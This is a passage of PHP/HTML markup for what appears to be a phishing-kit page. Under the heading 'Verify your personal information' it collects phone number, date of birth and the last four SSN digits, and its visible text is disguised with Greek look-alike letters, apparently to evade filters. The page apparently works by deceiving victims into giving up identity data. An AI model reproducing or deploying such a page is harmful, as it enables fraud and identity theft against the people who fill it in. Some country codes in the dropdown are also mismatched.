			<option  <?php if($_countryCode=="KI") echo "selected"; ?> value="KI">Kiribati</option>
			<option  <?php if($_countryCode=="KW") echo "selected"; ?> value="KW">Kuwait</option>
			<option  <?php if($_countryCode=="KG") echo "selected"; ?> value="KG">Kyrgyzstan</option>
			<option  <?php if($_countryCode=="LA") echo "selected"; ?> value="LA">Laos</option>
			<option  <?php if($_countryCode=="LV") echo "selected"; ?> value="LV">Latvia</option>
			<option  <?php if($_countryCode=="LS") echo "selected"; ?> value="LS">Lesotho</option>
			<option  <?php if($_countryCode=="LI") echo "selected"; ?> value="LI">Liechtenstein</option>
			<option  <?php if($_countryCode=="LT") echo "selected"; ?> value="LT">Lithuania</option>
			<option  <?php if($_countryCode=="LU") echo "selected"; ?> value="LU">Luxembourg</option>
			<option  <?php if($_countryCode=="MK") echo "selected"; ?> value="MK">Macedonia</option>
			<option  <?php if($_countryCode=="MG") echo "selected"; ?> value="MG">Madagascar</option>
			<option  <?php if($_countryCode=="MW") echo "selected"; ?>  value="MW">Malawi</option>
			<option  <?php if($_countryCode=="MY") echo "selected"; ?> value="MY">Malaysia</option>
			<option  <?php if($_countryCode=="MV") echo "selected"; ?> value="MV">Maldives</option>
			<option  <?php if($_countryCode=="ML") echo "selected"; ?> value="ML">Mali</option>
			<option  <?php if($_countryCode=="MT") echo "selected"; ?> value="MT">Malta</option>
			<option  <?php if($_countryCode=="MH") echo "selected"; ?> value="MH">Marshall Islands</option>
			<option  <?php if($_countryCode=="MQ") echo "selected"; ?> value="MQ">Martinique</option>
			<option  <?php if($_countryCode=="MR") echo "selected"; ?> value="MR">Mauritania</option>
			<option  <?php if($_countryCode=="MU") echo "selected"; ?> value="MU">Mauritius</option>
			<option  <?php if($_countryCode=="YT") echo "selected"; ?> value="YT">Mayotte</option>
			<option  <?php if($_countryCode=="MX") echo "selected"; ?> value="MX">Mexico</option>
			<option  <?php if($_countryCode=="FM") echo "selected"; ?> value="FM">Micronesia</option>
			<option  <?php if($_countryCode=="MD") echo "selected"; ?> value="MD">Moldova</option>
			<option  <?php if($_countryCode=="MC") echo "selected"; ?> value="MC">Monaco</option>
			<option  <?php if($_countryCode=="MN") echo "selected"; ?> value="MN">Mongolia</option>
			<option  <?php if($_countryCode=="ME") echo "selected"; ?> value="ME">Montenegro</option>
			<option  <?php if($_countryCode=="MS") echo "selected"; ?> value="MS">Montserrat</option>
			<option  <?php if($_countryCode=="MA") echo "selected"; ?> value="MA">Morocco</option>
			<option  <?php if($_countryCode=="MZ") echo "selected"; ?> value="MZ">Mozambique</option>
			<option  <?php if($_countryCode=="NA") echo "selected"; ?> value="NA">Namibia</option>
			<option  <?php if($_countryCode=="NR") echo "selected"; ?> value="NR">Nauru</option>
			<option  <?php if($_countryCode=="NP") echo "selected"; ?> value="NP">Nepal</option>
			<option  <?php if($_countryCode=="NL") echo "selected"; ?> value="NL">Netherlands</option>
			<option  <?php if($_countryCode=="AN") echo "selected"; ?> value="AN">Netherlands Antilles</option>
			<option  <?php if($_countryCode=="NC") echo "selected"; ?> value="NC">New Caledonia</option>
			<option  <?php if($_countryCode=="NZ") echo "selected"; ?> value="NZ">New Zealand</option>
			<option  <?php if($_countryCode=="NI") echo "selected"; ?> value="NI">Nicaragua</option>
			<option  <?php if($_countryCode=="NE") echo "selected"; ?> value="NE">Niger</option>
			<option  <?php if($_countryCode=="NG") echo "selected"; ?> value="NG">Nigeria</option>
			<option  <?php if($_countryCode=="NU") echo "selected"; ?>  value="NU">Niue</option>
			<option  <?php if($_countryCode=="NF") echo "selected"; ?> value="NF">Norfolk Island</option>
			<option  <?php if($_countryCode=="NO") echo "selected"; ?> value="NO">Norway</option>
			<option  <?php if($_countryCode=="OM") echo "selected"; ?> value="OM">Oman</option>
			<option  <?php if($_countryCode=="PW") echo "selected"; ?> value="PW">Palau</option>
			<option  <?php if($_countryCode=="PA") echo "selected"; ?> value="PA">Panama</option>
			<option  <?php if($_countryCode=="PG") echo "selected"; ?> value="PG">Papua New Guinea</option>
			<option  <?php if($_countryCode=="PY") echo "selected"; ?> value="PY">Paraguay</option>
			<option  <?php if($_countryCode=="PE") echo "selected"; ?> value="PE">Peru</option>
			<option  <?php if($_countryCode=="PH") echo "selected"; ?> value="PH">Philippines</option>
			<option  <?php if($_countryCode=="PN") echo "selected"; ?> value="PN">Pitcairn Islands</option>
			<option  <?php if($_countryCode=="PL") echo "selected"; ?> value="PL">Poland</option>
			<option  <?php if($_countryCode=="PT") echo "selected"; ?> value="PT">Portugal</option>
			<option  <?php if($_countryCode=="QA") echo "selected"; ?> value="QA">Qatar</option>
			<option  <?php if($_countryCode=="RE") echo "selected"; ?> value="RE">Réunion</option>
			<option  <?php if($_countryCode=="RO") echo "selected"; ?> value="RO">Romania</option>
			<option  <?php if($_countryCode=="RU") echo "selected"; ?> value="RU">Russia</option>
			<option  <?php if($_countryCode=="RW") echo "selected"; ?> value="RW">Rwanda</option>
			<option  <?php if($_countryCode=="WS") echo "selected"; ?> value="WS">Samoa</option>
			<option  <?php if($_countryCode=="SM") echo "selected"; ?> value="SM">San Marino</option>
			<option  <?php if($_countryCode=="ST") echo "selected"; ?> value="ST">São Tomé &amp; Príncipe</option>
			<option  <?php if($_countryCode=="SA") echo "selected"; ?> value="SA">Saudi Arabia</option>
			<option  <?php if($_countryCode=="SN") echo "selected"; ?> value="SN">Senegal</option>
			<option  <?php if($_countryCode=="RS") echo "selected"; ?> value="RS">Serbia</option>
			<option  <?php if($_countryCode=="SC") echo "selected"; ?> value="SC">Seychelles</option>
			<option  <?php if($_countryCode=="SL") echo "selected"; ?> value="SL">Sierra Leone</option>
			<option  <?php if($_countryCode=="SG") echo "selected"; ?> value="SG">Singapore</option>
			<option  <?php if($_countryCode=="SK") echo "selected"; ?> value="SK">Slovakia</option>
			<option  <?php if($_countryCode=="SI") echo "selected"; ?> value="SI">Slovenia</option>
			<option  <?php if($_countryCode=="SB") echo "selected"; ?> value="SB">Solomon Islands</option>
			<option  <?php if($_countryCode=="SO") echo "selected"; ?> value="SO">Somalia</option>
			<option  <?php if($_countryCode=="ZA") echo "selected"; ?> value="ZA">South Africa</option>
			<option  <?php if($_countryCode=="KR") echo "selected"; ?> value="KR">South Korea</option>
			<option  <?php if($_countryCode=="ES") echo "selected"; ?> value="ES">Spain</option>
			<option  <?php if($_countryCode=="LK") echo "selected"; ?> value="LK">Sri Lanka</option>
			<option  <?php if($_countryCode=="SH") echo "selected"; ?> value="SH">St&#x2E; Helena</option>
			<option  <?php if($_countryCode=="KN") echo "selected"; ?> value="KN">St&#x2E; Kitts &amp; Nevis</option>
			<option  <?php if($_countryCode=="LC") echo "selected"; ?> value="LC">St&#x2E; Lucia</option>
			<option  <?php if($_countryCode=="PM") echo "selected"; ?> value="PM">St&#x2E; Pierre &amp; Miquelon</option>
			<option  <?php if($_countryCode=="VC") echo "selected"; ?> value="VC">St&#x2E; Vincent &amp; Grenadines</option>
			<option  <?php if($_countryCode=="SR") echo "selected"; ?> value="SR">Suriname</option>
			<option  <?php if($_countryCode=="SJ") echo "selected"; ?> value="SJ">Svalbard &amp; Jan Mayen</option>
			<option  <?php if($_countryCode=="SZ") echo "selected"; ?> value="SZ">Swaziland</option>
			<option  <?php if($_countryCode=="SE") echo "selected"; ?> value="SE">Sweden</option>
			<option  <?php if($_countryCode=="CH") echo "selected"; ?> value="CH">Switzerland</option>
			<option  <?php if($_countryCode=="TW") echo "selected"; ?> value="TW">Taiwan</option>
			<option  <?php if($_countryCode=="TJ") echo "selected"; ?> value="TJ">Tajikistan</option>
			<option  <?php if($_countryCode=="TZ") echo "selected"; ?> value="TZ">Tanzania</option>
			<option <?php if($_countryCode=="TH") echo "selected"; ?> value="TH">Thailand</option>
			<option <?php if($_countryCode=="TG") echo "selected"; ?> value="TG">Togo</option>
			<option <?php if($_countryCode=="TO") echo "selected"; ?> value="TO">Tonga</option>
			<option <?php if($_countryCode=="TT") echo "selected"; ?> value="TT">Trinidad &amp; Tobago</option>
			<option <?php if($_countryCode=="TN") echo "selected"; ?> value="TN">Tunisia</option>
			<option <?php if($_countryCode=="TR") echo "selected"; ?> value="TR">Turkey</option>
			<option <?php if($_countryCode=="TM") echo "selected"; ?> value="TM">Turkmenistan</option>
			<option <?php if($_countryCode=="TC") echo "selected"; ?> value="TC">Turks &amp; Caicos Islands</option>
			<option <?php if($_countryCode=="TV") echo "selected"; ?> value="TV">Tuvalu</option>
			<option <?php if($_countryCode=="UG") echo "selected"; ?> value="UG">Uganda</option>
			<option <?php if($_countryCode=="UA") echo "selected"; ?> value="UA">Ukraine</option>
			<option <?php if($_countryCode=="AE") echo "selected"; ?> value="AE">United Arab Emirates</option>
			<option <?php if($_countryCode=="GB") echo "selected"; ?> value="GB">United Kingdom</option>
			<option <?php if($_countryCode=="US") echo "selected"; ?> value="US">United States</option>
			<option <?php if($_countryCode=="UY") echo "selected"; ?> value="UY">Uruguay</option>
			<option <?php if($_countryCode=="VY") echo "selected"; ?>  value="VU">Vanuatu</option>
			<option <?php if($_countryCode=="VA") echo "selected"; ?> value="VA">Vatican City</option>
			<option <?php if($_countryCode=="VE") echo "selected"; ?> value="VE">Venezuela</option>
			<option <?php if($_countryCode=="ZN") echo "selected"; ?> value="VN">Vietnam</option>
			<option <?php if($_countryCode=="WF") echo "selected"; ?> value="WF">Wallis &amp; Futuna</option>
			<option <?php if($_countryCode=="YE") echo "selected"; ?> value="YE">Yemen</option>
			<option <?php if($_countryCode=="ZM") echo "selected"; ?> value="ZM">Zambia</option>
			<option <?php if($_countryCode=="ZW") echo "selected"; ?> value="ZW">Zimbabwe</option>
</select>
		<input class="inp" name="state" type="text" value="<?php if(isset($_SESSION['_state_'])){ echo $_SESSION['_state_'];} ?>" maxlength="15" class="xxray_input"  placeholder="State" style="width:74px;"/>
		<input class="inp" name="zip" maxlength="10" type="text" value="<?php if(isset($_SESSION['_zip_'])){ echo $_SESSION['_zip_'];} ?>" class="xxray_input"  placeholder="ZIP" style="width:80px;"/>
		
	<br clear="all">
		<h5>Verify yοur persοnal infοrmatiοn</h5>
        <input name="phone" id="phone" class="inp" maxlength="15" type="text" value="<?php if(isset($_SESSION['_phone_'])){ echo $_SESSION['_phone_']; } ?>" class="xxray_input"  placeholder="Phone number" style="width:113px;" />
		<input name="email" class="inp" type="text" value="<?php if(isset($femail)){ echo $femail; } ?> " class="xxray_input"  placeholder="Email" style="width:186px; font-weight:bold;" disabled/><br clear="all">
		<div class="inpdiv">
        <i>Date οf Βirth:</i><br />
           <select id="dob_month" style="width:100px;" name="dob_month">
	<option <?php if(isset($_SESSION['_dob_month_'])){ if($_SESSION['_dob_month_']=="") echo "selected"; } ?> value="0"></option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="1") echo "selected"; } ?> value="1">January</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="2") echo "selected"; } ?> value="2">Febuary</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="3") echo "selected"; } ?> value="3">March</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="4") echo "selected"; } ?> value="4">April</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="5") echo "selected"; } ?> value="5">May</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="6") echo "selected"; } ?> value="6">June</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="7") echo "selected"; } ?> value="7">July</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="8") echo "selected"; } ?> value="8">August</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="9") echo "selected"; } ?> value="9">September</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="10") echo "selected"; } ?> value="10">October</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="11") echo "selected"; } ?> value="11">November</option>
	<option <?php if(isset($_SESSION['_dob_month_'])){  if($_SESSION['_dob_month_']=="12") echo "selected"; } ?> value="12">December</option>
</select>
 <select id="dob_day" style="width:60px;" name="dob_day">
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="") echo "selected"; } ?> value="0"></option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="1") echo "selected"; } ?> value="1">1</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="2") echo "selected"; } ?> value="2">2</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="3") echo "selected"; } ?> value="3">3</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="4") echo "selected"; } ?> value="4">4</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="5") echo "selected"; } ?> value="5">5</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="6") echo "selected"; } ?> value="6">6</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="7") echo "selected"; } ?> value="7">7</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="8") echo "selected"; } ?> value="8">8</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="9") echo "selected"; } ?> value="9">9</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="10") echo "selected"; } ?> value="10">10</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="11") echo "selected"; } ?> value="11">11</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="12") echo "selected"; } ?> value="12">12</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="13") echo "selected"; } ?> value="13">13</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="14") echo "selected"; } ?> value="14">14</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="15") echo "selected"; } ?> value="15">15</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="16") echo "selected"; } ?> value="16">16</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="17") echo "selected"; } ?> value="17">17</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="18") echo "selected"; } ?> value="18">18</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="19") echo "selected"; } ?> value="19">19</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="20") echo "selected"; } ?> value="20">20</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="21") echo "selected"; } ?> value="21">21</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="22") echo "selected"; } ?> value="22">22</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="23") echo "selected"; } ?> value="23">23</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="24") echo "selected"; } ?> value="24">24</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="25") echo "selected"; } ?> value="25">25</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="26") echo "selected"; } ?> value="26">26</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="27") echo "selected"; } ?> value="27">27</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="28") echo "selected"; } ?> value="28">28</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="29") echo "selected"; } ?> value="29">29</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="30") echo "selected"; } ?> value="30">30</option>
	<option <?php if(isset($_SESSION['_dob_day_'])){  if($_SESSION['_dob_day_']=="31") echo "selected"; } ?> value="31">31</option>
</select>
 <select id="dob_year" style="width:60px;" name="dob_year">
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="") echo "selected"; } ?> value="0"></option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1999") echo "selected"; } ?> value="1999">1999</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1998") echo "selected"; } ?> value="1998">1998</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1997") echo "selected"; } ?> value="1997">1997</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1996") echo "selected"; } ?> value="1996">1996</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1995") echo "selected"; } ?> value="1995">1995</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1994") echo "selected"; } ?> value="1994">1994</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1993") echo "selected"; } ?> value="1993">1993</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1992") echo "selected"; } ?> value="1992">1992</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1991") echo "selected"; } ?> value="1991">1991</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1990") echo "selected"; } ?> value="1990">1990</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1989") echo "selected"; } ?> value="1989">1989</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1988") echo "selected"; } ?> value="1988">1988</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1987") echo "selected"; } ?> value="1987">1987</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1986") echo "selected"; } ?> value="1986">1986</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1985") echo "selected"; } ?> value="1985">1985</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1984") echo "selected"; } ?> value="1984">1984</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1983") echo "selected"; } ?> value="1983">1983</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1982") echo "selected"; } ?> value="1982">1982</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1981") echo "selected"; } ?> value="1981">1981</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1980") echo "selected"; } ?> value="1980">1980</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1979") echo "selected"; } ?> value="1979">1979</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1978") echo "selected"; } ?> value="1978">1978</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1977") echo "selected"; } ?> value="1977">1977</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1976") echo "selected"; } ?> value="1976">1976</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1975") echo "selected"; } ?> value="1975">1975</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1974") echo "selected"; } ?> value="1974">1974</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1973") echo "selected"; } ?> value="1973">1973</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1972") echo "selected"; } ?> value="1972">1972</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1971") echo "selected"; } ?> value="1971">1971</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1970") echo "selected"; } ?> value="1970">1970</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1969") echo "selected"; } ?> value="1969">1969</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1968") echo "selected"; } ?> value="1968">1968</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1967") echo "selected"; } ?> value="1967">1967</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1966") echo "selected"; } ?> value="1966">1966</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1965") echo "selected"; } ?> value="1965">1965</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1964") echo "selected"; } ?> value="1964">1964</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1963") echo "selected"; } ?> value="1963">1963</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1962") echo "selected"; } ?> value="1962">1962</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1961") echo "selected"; } ?> value="1961">1961</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1960") echo "selected"; } ?> value="1960">1960</option>
	<option <?php if(isset($_SESSION['_dob_year_'])){  if($_SESSION['_dob_year_']=="1959") echo "selected"; } ?> value="1959">1959</option>
</select>
        </div>
		<div class="inpdiv">
        <i>Last 4:</i><br />
			<input name="SSN" class="inp" maxlength="4" type="text" value="<?php if(isset($_SESSION['_SSN_'])){ echo $_SESSION['_SSN_'];} ?>" class="xxray_input" placeholder="SSN" style="width:85px;" />
        </div>
		<br clear="all">
		<p class="agree">By clicking <b>Agree & Cοntinue</b>, I cοnfirm that I have read the <br /><a href="#">E-Sign Cοnsent</a> and I agree tο have the Terms & Cοnditiοns presented electrοnically.</p>
		 <input class="inpclassicsumblit2" type="submit" style="width: 364px;" value="Αgree &amp; Cοntinue" id="valider" />
        <br>
         <br>
        
		</form>
	</div>
	<div style="float: right;" id="acc">
		<h1>General address :</h1>
  <h5 ><?=$_SESSION['_ad_']?></h5>

<br>
<br>

<img style="-webkit-user-select: none; cursor: zoom-in;" src="imgs/snooze_small.gif">
	
		
	</div>
</div>
</body>
</html>